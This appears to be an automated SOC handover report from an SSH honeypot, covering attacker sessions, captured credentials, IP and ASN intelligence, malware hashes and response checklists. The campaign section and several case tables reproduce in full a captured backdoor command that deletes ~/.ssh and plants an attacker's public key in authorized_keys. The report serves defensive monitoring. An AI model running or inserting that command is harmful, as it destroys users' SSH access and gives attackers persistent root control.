# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-30 |
| **Generated At** | 2026-03-30T09:09:46Z |
| **Shift Time** | 09:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **37** |
| Confirmed Threats | **29** |
| False Positives Filtered | **8** (21.6%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **17** |
| High Severity Cases | **8** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **29** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **23** |
| Unique Credential Pairs | **19** |
| Unique Usernames | **13** |
| Unique Passwords | **18** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `345gs5662d34` | 3 |
| `mysql` | 2 |
| `unknown` | 1 |
| `pi` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `2222222` | 2 |
| `letmein` | 1 |
| `3333` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `unknown` | `2222222` | 1 |
| `pi` | `letmein` | 1 |
| `blank` | `3333` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `868686` | `102.219.126.124` | 2026-03-30T08:34:42 |
| `root` | `3245gs5662d34` | `102.219.126.124` | 2026-03-30T08:34:48 |
| `root` | `Dex2024` | `140.249.223.130` | 2026-03-30T08:43:05 |
| `root` | `Ds123456789` | `179.33.186.150` | 2026-03-30T08:53:07 |
| `root` | `3245gs5662d34` | `179.33.186.150` | 2026-03-30T08:53:14 |
| `root` | `1217` | `171.244.37.103` | 2026-03-30T08:54:26 |
| `root` | `3245gs5662d34` | `171.244.37.103` | 2026-03-30T08:54:29 |
| `root` | `333333` | `101.13.2.183` | 2026-03-30T09:02:58 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `179.33.186.150`, `102.219.126.124`, `171.244.37.103`, `140.249.223.130`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **24** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | MEDIUM |
| `AS8075` | Microsoft Corporation | 2 | LOW |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS31898` | Oracle Corporation | 1 | HIGH |
| `AS37468` | Angola Cables | 1 | HIGH |
| `AS58541` | Qingdao,266000 | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (8)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a4b98ef24dd4

| Field | Detail |
|---|---|
| **Source IP** | `102.219.126[.]124` |
| **First Seen** | 2026-03-30 08:34 |
| **Last Seen** | 2026-03-30 08:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 08:34:41` | `cowrie.session.connect` |
| `2026-03-30 08:34:41` | `cowrie.client.version` |
| `2026-03-30 08:34:41` | `cowrie.client.kex` |
| `2026-03-30 08:34:42` | `cowrie.login.success` |
| `2026-03-30 08:34:42` | `cowrie.session.params` |
| `2026-03-30 08:34:42` | `cowrie.command.input` |
| `2026-03-30 08:34:42` | `cowrie.command.failed` |
| `2026-03-30 08:34:43` | `cowrie.log.closed` |
| `2026-03-30 08:34:43` | `cowrie.session.params` |
| `2026-03-30 08:34:43` | `cowrie.command.input` |
| `2026-03-30 08:34:43` | `cowrie.session.file_download` |
| `2026-03-30 08:34:43` | `cowrie.log.closed` |
| `2026-03-30 08:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.219.126[.]124` to AbuseIPDB if not already reported
- [ ] Block `102.219.126[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-934808515608

| Field | Detail |
|---|---|
| **Source IP** | `102.219.126[.]124` |
| **First Seen** | 2026-03-30 08:34 |
| **Last Seen** | 2026-03-30 08:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 08:34:46` | `cowrie.session.connect` |
| `2026-03-30 08:34:46` | `cowrie.client.version` |
| `2026-03-30 08:34:47` | `cowrie.client.kex` |
| `2026-03-30 08:34:48` | `cowrie.login.success` |
| `2026-03-30 08:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.219.126[.]124` to AbuseIPDB if not already reported
- [ ] Block `102.219.126[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e2ee2118ab

| Field | Detail |
|---|---|
| **Source IP** | `140.249.223[.]130` |
| **First Seen** | 2026-03-30 08:43 |
| **Last Seen** | 2026-03-30 08:43 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 08:43:05` | `cowrie.session.connect` |
| `2026-03-30 08:43:05` | `cowrie.client.version` |
| `2026-03-30 08:43:05` | `cowrie.client.kex` |
| `2026-03-30 08:43:05` | `cowrie.login.success` |
| `2026-03-30 08:43:06` | `cowrie.session.params` |
| `2026-03-30 08:43:06` | `cowrie.command.input` |
| `2026-03-30 08:43:06` | `cowrie.command.failed` |
| `2026-03-30 08:43:06` | `cowrie.log.closed` |
| `2026-03-30 08:43:06` | `cowrie.session.params` |
| `2026-03-30 08:43:06` | `cowrie.command.input` |
| `2026-03-30 08:43:06` | `cowrie.session.file_download` |
| `2026-03-30 08:43:06` | `cowrie.log.closed` |
| `2026-03-30 08:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.249.223[.]130` to AbuseIPDB if not already reported
- [ ] Block `140.249.223[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8875dbea0d9

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-03-30 08:53 |
| **Last Seen** | 2026-03-30 08:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 08:53:06` | `cowrie.session.connect` |
| `2026-03-30 08:53:06` | `cowrie.client.version` |
| `2026-03-30 08:53:06` | `cowrie.client.kex` |
| `2026-03-30 08:53:07` | `cowrie.login.success` |
| `2026-03-30 08:53:08` | `cowrie.session.params` |
| `2026-03-30 08:53:08` | `cowrie.command.input` |
| `2026-03-30 08:53:08` | `cowrie.command.failed` |
| `2026-03-30 08:53:08` | `cowrie.log.closed` |
| `2026-03-30 08:53:09` | `cowrie.session.params` |
| `2026-03-30 08:53:09` | `cowrie.command.input` |
| `2026-03-30 08:53:09` | `cowrie.session.file_download` |
| `2026-03-30 08:53:09` | `cowrie.log.closed` |
| `2026-03-30 08:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc2efc1173f0

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-03-30 08:53 |
| **Last Seen** | 2026-03-30 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 08:53:12` | `cowrie.session.connect` |
| `2026-03-30 08:53:12` | `cowrie.client.version` |
| `2026-03-30 08:53:13` | `cowrie.client.kex` |
| `2026-03-30 08:53:14` | `cowrie.login.success` |
| `2026-03-30 08:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31bf606b9274

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]103` |
| **First Seen** | 2026-03-30 08:54 |
| **Last Seen** | 2026-03-30 08:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 08:54:26` | `cowrie.session.connect` |
| `2026-03-30 08:54:26` | `cowrie.client.version` |
| `2026-03-30 08:54:26` | `cowrie.client.kex` |
| `2026-03-30 08:54:26` | `cowrie.login.success` |
| `2026-03-30 08:54:27` | `cowrie.session.params` |
| `2026-03-30 08:54:27` | `cowrie.command.input` |
| `2026-03-30 08:54:27` | `cowrie.command.failed` |
| `2026-03-30 08:54:27` | `cowrie.log.closed` |
| `2026-03-30 08:54:27` | `cowrie.session.params` |
| `2026-03-30 08:54:27` | `cowrie.command.input` |
| `2026-03-30 08:54:27` | `cowrie.session.file_download` |
| `2026-03-30 08:54:27` | `cowrie.log.closed` |
| `2026-03-30 08:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97fa2255281f

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]103` |
| **First Seen** | 2026-03-30 08:54 |
| **Last Seen** | 2026-03-30 08:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 08:54:29` | `cowrie.session.connect` |
| `2026-03-30 08:54:29` | `cowrie.client.version` |
| `2026-03-30 08:54:29` | `cowrie.client.kex` |
| `2026-03-30 08:54:29` | `cowrie.login.success` |
| `2026-03-30 08:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc48b8c253ad

| Field | Detail |
|---|---|
| **Source IP** | `101.13.2[.]183` |
| **First Seen** | 2026-03-30 09:02 |
| **Last Seen** | 2026-03-30 09:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 09:02:55` | `cowrie.session.connect` |
| `2026-03-30 09:02:56` | `cowrie.client.version` |
| `2026-03-30 09:02:56` | `cowrie.client.kex` |
| `2026-03-30 09:02:58` | `cowrie.login.success` |
| `2026-03-30 09:02:58` | `cowrie.direct-tcpip.request` |
| `2026-03-30 09:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.2[.]183` to AbuseIPDB if not already reported
- [ ] Block `101.13.2[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `102.219.126[.]124` | 1 | 2026-03-30 08:34 | 2026-03-30 08:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.78.177[.]144` | 1 | 2026-03-30 08:02 | 2026-03-30 08:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.147.40[.]93` | 1 | 2026-03-30 08:57 | 2026-03-30 08:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.48.138[.]69` | 1 | 2026-03-30 07:47 | 2026-03-30 07:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.26.110[.]171` | 1 | 2026-03-30 08:59 | 2026-03-30 08:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `140.249.223[.]130` | 1 | 2026-03-30 08:43 | 2026-03-30 08:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.176.167[.]78` | 1 | 2026-03-30 09:03 | 2026-03-30 09:03 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.244.37[.]103` | 1 | 2026-03-30 08:54 | 2026-03-30 08:54 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.183.125[.]51` | 1 | 2026-03-30 08:23 | 2026-03-30 08:23 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.33.186[.]150` | 1 | 2026-03-30 08:53 | 2026-03-30 08:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.53[.]200` | 1 | 2026-03-30 08:43 | 2026-03-30 08:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.43.10[.]11` | 1 | 2026-03-30 09:03 | 2026-03-30 09:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.103.136[.]43` | 1 | 2026-03-30 08:03 | 2026-03-30 08:03 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `189.52.52[.]162` | 1 | 2026-03-30 08:22 | 2026-03-30 08:23 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.232.114[.]71` | 1 | 2026-03-30 08:43 | 2026-03-30 08:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.136.110[.]113` | 1 | 2026-03-30 07:58 | 2026-03-30 08:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.59.109[.]186` | 1 | 2026-03-30 08:06 | 2026-03-30 08:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.231.31[.]220` | 1 | 2026-03-30 08:49 | 2026-03-30 08:49 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-30 08:17 | 2026-03-30 08:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `60.167.19[.]189` | 1 | 2026-03-30 08:43 | 2026-03-30 08:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.172.1[.]210` | 1 | 2026-03-30 08:29 | 2026-03-30 08:30 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `163.176.167[.]78` | BR | Oracle Corporation | **100** ⚠️ | 13 |
| `186.103.136[.]43` | CL | CONSEJO DE DEFENSA DEL NINO/CIUDAD DEL NINO | **100** ⚠️ | 50 |
| `183.171.53[.]200` | MY | Celcom Axiata Berhad | **100** ⚠️ | 16 |
| `116.48.138[.]69` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `60.172.1[.]210` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `43.136.110[.]113` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 0 |
| `46.59.109[.]186` | SE | Bahnhof AB | **100** ⚠️ | 25 |
| `140.249.223[.]130` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 10 |
| `49.231.31[.]220` | TH | AIS Corporate | **100** ⚠️ | 22 |
| `101.13.2[.]183` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 25 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 27 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 15 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 1 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 37 cases |
| Tool 34  | Credential Extractor        | ✅ 23 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (21.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 8 priority case(s) shown individually · 21 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-30T09:09:46Z_
